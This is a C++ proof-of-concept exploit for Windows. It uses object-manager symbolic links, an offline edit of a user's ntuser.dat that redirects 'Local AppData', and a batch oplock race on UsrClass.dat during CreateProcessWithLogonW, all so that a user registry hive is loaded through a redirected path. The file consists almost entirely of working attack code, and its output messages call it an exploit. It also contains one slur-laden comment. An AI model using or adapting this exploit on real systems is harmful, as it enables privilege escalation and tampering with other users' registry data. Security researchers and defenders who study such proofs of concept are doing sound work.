#define _CRT_SECURE_NO_WARNINGS
#include <iostream>
#include <Windows.h>
#include <winternl.h>
#include <UserEnv.h>
#include <AclAPI.h>
#include <ntstatus.h>
#include <conio.h>
#include "offreg.h"
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "userenv.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "offreg.lib")
#pragma comment(lib, "Rpcrt4.lib")
#pragma warning(disable : 4996)

HMODULE hm = GetModuleHandle(L"ntdll.dll");
NTSTATUS(WINAPI* _NtCreateSymbolicLinkObject)(
	OUT PHANDLE             pHandle,
	IN ACCESS_MASK          DesiredAccess,
	IN POBJECT_ATTRIBUTES   ObjectAttributes,
	IN PUNICODE_STRING      DestinationName) = (NTSTATUS(WINAPI*)(
		OUT PHANDLE             pHandle,
		IN ACCESS_MASK          DesiredAccess,
		IN POBJECT_ATTRIBUTES   ObjectAttributes,
		IN PUNICODE_STRING      DestinationName))GetProcAddress(hm, "NtCreateSymbolicLinkObject");
NTSTATUS(WINAPI* _NtCreateDirectoryObjectEx)(
	OUT PHANDLE             DirectoryHandle,
	IN ACCESS_MASK          DesiredAccess,
	IN POBJECT_ATTRIBUTES   ObjectAttributes,
	IN HANDLE ShadowDirectoryHandle,
	IN ULONG Flags) =
	(NTSTATUS(WINAPI*)(
		OUT PHANDLE             DirectoryHandle,
		IN ACCESS_MASK          DesiredAccess,
		IN POBJECT_ATTRIBUTES   ObjectAttributes,
		IN HANDLE ShadowDirectoryHandle,
		IN ULONG Flags))GetProcAddress(hm, "NtCreateDirectoryObjectEx");

struct HVarg {
	wchar_t* username;
	wchar_t* password;
	HANDLE hprocess;
	HANDLE hcallerthread;
};

void GenGUID(wchar_t* guid)
{
	GUID uid = { 0 };
	RPC_WSTR wuid = { 0 };
	UuidCreate(&uid);
	UuidToStringW(&uid, &wuid);
	wchar_t* wuid2 = (wchar_t*)wuid;
	wcscpy(guid, wuid2);
}

bool CreateDirectoryWithPermissiveDACL(wchar_t* dirpath)
{
	PSID pEveryoneSID = NULL;
	PACL pACL = NULL;
	EXPLICIT_ACCESS ea;
	SID_IDENTIFIER_AUTHORITY SIDAuthWorld = SECURITY_WORLD_SID_AUTHORITY;
	if (!AllocateAndInitializeSid(&SIDAuthWorld, 1,
		SECURITY_WORLD_RID,
		0, 0, 0, 0, 0, 0, 0,
		&pEveryoneSID))
	{
		printf("AllocateAndInitializeSid, error: %d\n", GetLastError());
		return false;
	}

	ZeroMemory(&ea, sizeof(EXPLICIT_ACCESS));
	ea.grfAccessPermissions = GENERIC_ALL;
	ea.grfAccessMode = SET_ACCESS;
	ea.grfInheritance = SUB_CONTAINERS_AND_OBJECTS_INHERIT | NO_INHERITANCE;

	ea.Trustee.TrusteeForm = TRUSTEE_IS_SID;
	ea.Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;
	ea.Trustee.ptstrName = (LPTSTR)pEveryoneSID;

	DWORD dwRes = SetEntriesInAcl(1, &ea, NULL, &pACL);
	if (dwRes != ERROR_SUCCESS) {
		printf("SetEntriesInAcl, error: %d\n", dwRes);
		FreeSid(pEveryoneSID);
		return false;
	}
	PSECURITY_DESCRIPTOR sd = (PSECURITY_DESCRIPTOR)LocalAlloc(LMEM_FIXED, SECURITY_DESCRIPTOR_MIN_LENGTH);
	InitializeSecurityDescriptor(sd, SECURITY_DESCRIPTOR_REVISION);
	SetSecurityDescriptorDacl(sd, TRUE, pACL, FALSE);
	SECURITY_ATTRIBUTES sa = { 0 };
	sa.nLength = sizeof(sa);
	sa.lpSecurityDescriptor = sd;

	bool retval = true;
	if (!CreateDirectory(dirpath, &sa))
	{
		printf("Failed to create directory %ws, error : %d\n", dirpath, GetLastError());
		retval = false;
	}
	if (sd) LocalFree(sd);
	if (pEveryoneSID) FreeSid(pEveryoneSID);
	if (pACL) LocalFree(pACL);
	return retval;
}

void ThrowFunc()
{
	throw 1;
}

void RaiseExceptionInThread(HANDLE hthread)
{
	CONTEXT ctx = { 0 };
	ctx.ContextFlags = CONTEXT_FULL;
	SuspendThread(hthread);

	if (GetThreadContext(hthread, &ctx))
	{
		ctx.Rip = (DWORD64)ThrowFunc;
		SetThreadContext(hthread, &ctx);
		ResumeThread(hthread);
	}
}

DWORD WINAPI HiveLoaderThread(void* creds)
{
	HVarg* _creds = (HVarg*)creds;
	if (!_creds) {
		RaiseExceptionInThread(_creds->hcallerthread);
		return 1;
	}
	STARTUPINFO si = { 0 };
	PROCESS_INFORMATION pi = { 0 };

	if (!CreateProcessWithLogonW(_creds->username, NULL, _creds->password, LOGON_WITH_PROFILE, L"C:\\Windows\\notepad.exe", NULL, CREATE_SUSPENDED, NULL, NULL, &si, &pi))
	{
		printf("CreateProcessWithLogonW failed with error : %d\n", GetLastError());
		RaiseExceptionInThread(_creds->hcallerthread);
		return 1;
	}
	CloseHandle(pi.hThread);
	_creds->hprocess = pi.hProcess;
	return ERROR_SUCCESS;
}

int wmain(int argc, wchar_t **argv)
{

    if (argc != 4)
    {
        printf("Usage %ws <username> <password> <target_user_hive>\n", argv[0]);
        return 0;
    }
	OSVERSIONINFO osver = { 0 };
	osver.dwOSVersionInfoSize = sizeof(osver);
	GetVersionEx(&osver);

	DWORD tid = NULL;
	HANDLE hthread = NULL;
	HVarg targ = { 0 };
	targ.username = argv[1];
	targ.password = argv[2];


	HANDLE htoken = NULL;
	HKEY hloadedhive = NULL;
	wchar_t userhivepath[MAX_PATH] = { 0 };
	HANDLE huserhive = NULL;
	ORHKEY hivemap = NULL;
	DWORD retval = NULL;
	ORHKEY htargetkey = NULL;
	bool shouldrestore = false;
	wchar_t existinglocalappdatapath[MAX_PATH] = { 0 };
	wchar_t guid[64] = { 0 };
	GenGUID(guid);
	wchar_t newlappdata[MAX_PATH] = L"\\\\.\\globalroot\\BaseNamedObjects\\Restricted";
	DWORD elapsz = NULL;
	bool cleandir = false;
	wchar_t workdir[MAX_PATH] = { L"C:\\" };
	wcscat(workdir, guid);

	NTSTATUS stat = STATUS_SUCCESS;
	HANDLE hworkdirobj = NULL;
	HANDLE hmsdirobj = NULL;
	HANDLE hwindirlnk = NULL;
	HANDLE hwindirlnk1 = NULL;

	wchar_t newhivepath[MAX_PATH] = { 0 };
	wsprintf(newhivepath, L"%s\\ntuser.dat", workdir);

	wchar_t usrclasshivepath[MAX_PATH] = { 0 };
	wchar_t usrclasshivepathnew[MAX_PATH] = { 0 };
	wsprintf(usrclasshivepathnew, L"%s\\UsrClass.dat", workdir);

	void* hivebuff = NULL;
	DWORD hivesz = NULL;
	LARGE_INTEGER li = { 0 };
	DWORD readbytes = 0;

	wchar_t _winlnktarget1[MAX_PATH] = { 0 };
	wsprintf(_winlnktarget1, L"\\??\\C:\\%s", guid);
	UNICODE_STRING winlnktarget1 = { 0 };
	RtlInitUnicodeString(&winlnktarget1, _winlnktarget1);
	wchar_t _winlnktarget2[MAX_PATH] = { 0 };
	wsprintf(_winlnktarget2, L"\\??\\C:\\Users\\%s\\AppData\\Local\\Microsoft\\Windows", argv[3]);
	UNICODE_STRING winlnktarget2 = { 0 };
	RtlInitUnicodeString(&winlnktarget2, _winlnktarget2);

	UNICODE_STRING msdirobjpath = { 0 };
	UNICODE_STRING workdirobjpath = { 0 };
	OBJECT_ATTRIBUTES msdirobjattr = { 0 };
	OBJECT_ATTRIBUTES workdirobjattr = { 0 };
	RtlInitUnicodeString(&msdirobjpath, L"\\BaseNamedObjects\\Restricted\\Microsoft");

	wchar_t _workdirobjpath[MAX_PATH] = { 0 };
	wsprintf(_workdirobjpath, L"\\BaseNamedObjects\\Restricted\\%s", guid);
	RtlInitUnicodeString(&workdirobjpath, _workdirobjpath);
	UNICODE_STRING uwin = { 0 };
	RtlInitUnicodeString(&uwin, L"Windows");
	OBJECT_ATTRIBUTES winlnkobjattr1 = { 0 };

	HANDLE hlock = NULL;
	OVERLAPPED ov = { 0 };
	DWORD transfersz = NULL;
	try {

		targ.hcallerthread = OpenThread(THREAD_ALL_ACCESS, FALSE, GetCurrentThreadId());
		if (!targ.hcallerthread)
		{
			printf("Failed to open current thread, error : %d\n", GetLastError());
			goto cleanup;
		}
		InitializeObjectAttributes(&workdirobjattr, &workdirobjpath, OBJ_CASE_INSENSITIVE, NULL, NULL);
		stat = _NtCreateDirectoryObjectEx(&hworkdirobj, GENERIC_ALL, &workdirobjattr, NULL, NULL);
		if (stat)
		{
			printf("Failed to create object directory %ws, error : 0x%0.8X\n", workdirobjpath.Buffer, stat);
			goto cleanup;
		}
		InitializeObjectAttributes(&msdirobjattr, &msdirobjpath, OBJ_CASE_INSENSITIVE, NULL, NULL);
		stat = _NtCreateDirectoryObjectEx(&hmsdirobj, GENERIC_ALL, &msdirobjattr, hworkdirobj, NULL);
		if (stat)
		{
			printf("Failed to create object directory %ws\n, error : 0x%0.8X\n", msdirobjpath.Buffer, stat);
			goto cleanup;
		}
		InitializeObjectAttributes(&winlnkobjattr1, &uwin, OBJ_CASE_INSENSITIVE, hmsdirobj, NULL);
		stat = _NtCreateSymbolicLinkObject(&hwindirlnk, GENERIC_ALL, &winlnkobjattr1, &winlnktarget1);
		if (stat)
		{
			printf("Failed to create object symbolic link %ws\\%ws\n, error : 0x%0.8X\n", msdirobjpath.Buffer, uwin.Buffer, stat);
			goto cleanup;
		}
		InitializeObjectAttributes(&winlnkobjattr1, &uwin, OBJ_CASE_INSENSITIVE, hworkdirobj, NULL);
		stat = _NtCreateSymbolicLinkObject(&hwindirlnk1, GENERIC_ALL, &winlnkobjattr1, &winlnktarget2);
		if (stat)
		{
			printf("Failed to create object symbolic link %ws\\%ws\n, error : 0x%0.8X\n", workdirobjpath.Buffer, uwin.Buffer, stat);
			goto cleanup;
		}

		cleandir = CreateDirectoryWithPermissiveDACL(workdir);
		if (!cleandir)
			goto cleanup;
		if (!LogonUser(argv[1], NULL, argv[2], LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT, &htoken) || !htoken) {
			printf("LogonUser failed, error : %d\n", GetLastError());
			goto cleanup;
		}
		if (!ImpersonateLoggedOnUser(htoken))
		{
			printf("ImpersonateLoggedOnUser failed, error : %d\n", GetLastError());
			goto cleanup;
		}

		ExpandEnvironmentStringsForUser(htoken, L"C:\\Users\\%USERNAME%\\ntuser.dat", userhivepath, MAX_PATH);
		ExpandEnvironmentStringsForUser(htoken, L"C:\\Users\\%USERNAME%\\AppData\\Local\\Microsoft\\Windows\\UsrClass.dat", usrclasshivepath, MAX_PATH);
		huserhive = CreateFile(userhivepath, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		if (!huserhive || huserhive == INVALID_HANDLE_VALUE)
		{
			printf("Failed to open user hive \"%ws\", error : %d\n", userhivepath, GetLastError());
			goto cleanup;
		}
		GetFileSizeEx(huserhive, &li);
		hivesz = li.QuadPart;
		hivebuff = malloc(hivesz);
		if (!ReadFile(huserhive, hivebuff, hivesz, &readbytes, NULL) || hivesz != readbytes)
		{
			printf("Failed to backup target user hive content, error : %d\n", GetLastError());
			goto cleanup;
		}

		// fucking retarded
		SetFilePointer(huserhive, NULL, NULL, FILE_BEGIN);
		retval = OROpenHiveByHandle(huserhive, &hivemap);
		if (retval)
		{
			printf("Failed to map user hive to memory, error %d\n", retval);
			goto cleanup;
		}
		retval = OROpenKey(hivemap, L"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders", &htargetkey);
		if (retval)
		{
			printf("Failed to open HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders, error %d\n", retval);
			goto cleanup;
		}
		retval = ORSetValue(htargetkey, L"Local AppData", REG_EXPAND_SZ, (LPBYTE)newlappdata, wcslen(newlappdata) * sizeof(wchar_t) + sizeof(wchar_t));
		if (retval)
		{
			printf("Failed to set HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\\Local AppData, error %d\n", retval);
			goto cleanup;
		}
		ORCloseKey(htargetkey);
		htargetkey = NULL;
		retval = ORSaveHive(hivemap, newhivepath, osver.dwMajorVersion, osver.dwMinorVersion);
		if (retval)
		{
			printf("Failed to save new hive content, error : %d\n", retval);
			goto cleanup;
		}
		ORCloseHive(hivemap);
		hivemap = NULL;
		CloseHandle(huserhive);
		huserhive = NULL;
		if (!MoveFileEx(newhivepath, userhivepath, MOVEFILE_REPLACE_EXISTING))
		{
			printf("Failed to apply hive changes, error : %d\n", GetLastError());
			goto cleanup;
		}
		shouldrestore = true;
		if (!CopyFile(usrclasshivepath, usrclasshivepathnew, FALSE))
		{
			printf("Failed to copy UsrClass.dat, error : %d\n", GetLastError());
			goto cleanup;
		}
		
		hlock = CreateFile(usrclasshivepathnew, GENERIC_READ | GENERIC_WRITE | DELETE, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_FLAG_OVERLAPPED, NULL);
		if (!hlock || hlock == INVALID_HANDLE_VALUE)
		{
			printf("Failed to open %ws, error : %d\n", usrclasshivepathnew, GetLastError());
			goto cleanup;
		}
		ov.hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
		DeviceIoControl(hlock, FSCTL_REQUEST_BATCH_OPLOCK, NULL, NULL, NULL, NULL, NULL, &ov);

		if (GetLastError() != ERROR_IO_PENDING)
		{
			printf("Failed to request a batch oplock on the update file, error : %d", GetLastError());
			goto cleanup;
		}



		hthread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)HiveLoaderThread, &targ, NULL, &tid);
		if (!hthread)
		{
			printf("Failed to create helper thread, error : %d\n", GetLastError());
			goto cleanup;
		}
		GetOverlappedResult(hlock, &ov, &transfersz, TRUE);
		CloseHandle(hwindirlnk);
		hwindirlnk = NULL;
		printf("oplock triggered !\n");
		CloseHandle(hlock);
		hlock = NULL;

		
		WaitForSingleObject(hthread, INFINITE);

		retval = RegOpenUserClassesRoot(htoken, NULL, MAXIMUM_ALLOWED, &hloadedhive);
		if (hloadedhive)
		{
			RegCloseKey(hloadedhive);
			hloadedhive = NULL;
		}
		if (retval)
		{
			printf("Exploit failed, hive was not loaded.\n");
			goto cleanup;
		}
		printf("Hive loaded, press any key to unload and exit.\n");

	}
	catch (DWORD exception)
	{
		goto cleanup;
	}
cleanup:
	_getch();
	if (hloadedhive)
	{
		CloseHandle(hloadedhive);
		hloadedhive = NULL;
	}

	if (hthread) {
		TerminateThread(hthread, ERROR_SUCCESS);
		CloseHandle(hthread);
		hthread = NULL;
	}
	if (targ.hcallerthread)
	{
		CloseHandle(targ.hcallerthread);
		targ.hcallerthread = NULL;
	}
	if (targ.hprocess)
	{
		TerminateProcess(targ.hprocess, ERROR_SUCCESS);
		CloseHandle(targ.hprocess);
		targ.hprocess = NULL;
	}
	Sleep(500);
	if (ov.hEvent)
	{
		CloseHandle(ov.hEvent);
		ov = { 0 };
	}
	if (hwindirlnk)
	{
		CloseHandle(hwindirlnk);
		hwindirlnk = NULL;
	}
	if (hwindirlnk1)
	{
		CloseHandle(hwindirlnk1);
		hwindirlnk1 = NULL;
	}

	if (hmsdirobj)
	{
		CloseHandle(hmsdirobj);
		hmsdirobj = NULL;
	}
	if (hworkdirobj)
	{
		CloseHandle(hworkdirobj);
		hworkdirobj = NULL;
	}

	if (huserhive)
	{
		CloseHandle(huserhive);
		huserhive = NULL;
	}
	if (hivemap)
	{
		ORCloseHive(hivemap);
		hivemap = NULL;
	}
	if (shouldrestore)
	{
		huserhive = CreateFile(userhivepath, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		if (!huserhive || huserhive == INVALID_HANDLE_VALUE)
		{}
		else {
			WriteFile(huserhive, hivebuff, hivesz, &readbytes, NULL);
			CloseHandle(huserhive);
			huserhive = NULL;
		}
	}
	RevertToSelf();
	if (GetFileAttributes(usrclasshivepathnew) != INVALID_FILE_ATTRIBUTES) {
		DeleteFile(usrclasshivepathnew);
	}
	if (GetFileAttributes(newhivepath) != INVALID_FILE_ATTRIBUTES) {
		DeleteFile(newhivepath);
	}
	if (htoken) {
		CloseHandle(htoken);
		htoken = NULL;
	}
	if (cleandir)
		RemoveDirectory(workdir);
    return 0;
}
